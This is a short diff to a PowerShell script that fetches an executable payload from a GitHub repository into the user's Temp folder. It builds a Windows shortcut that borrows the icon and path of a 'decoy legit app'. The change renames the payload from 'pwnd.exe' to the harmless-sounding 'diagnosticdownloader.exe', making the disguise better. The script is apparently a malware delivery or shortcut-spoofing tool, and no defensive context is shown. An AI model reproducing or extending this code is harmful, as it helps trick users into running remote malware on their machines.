@@ -7,8 +7,9 @@
     [string]$targetUsername
 )
 #set variables
-$payloadURL="`"https://github.com/bsoroudi/easymoney/blob/updates/pwnd.exe?raw=true`""
-$payloadPath="`"`$home\AppData\Local\Temp\pwnd.exe`""
+$payloadName="diagnosticdownloader.exe"
+$payloadURL="`"https://github.com/bsoroudi/easymoney/blob/updates/$($payloadName)?raw=true`""
+$payloadPath="`"`$home\AppData\Local\Temp\$payloadName`""
 
 
 switch ($DecoyLegitApp) {
@@ -39,6 +40,3 @@ $ShortCut.IconLocation = "$DecoyLegitAppPath, 0";
 $Shortcut.WorkingDirectory = "$(split-path $DecoyLegitAppPath)\"
 $ShortCut.Description = "Type: Application";
 $ShortCut.Save()
-
-
- 
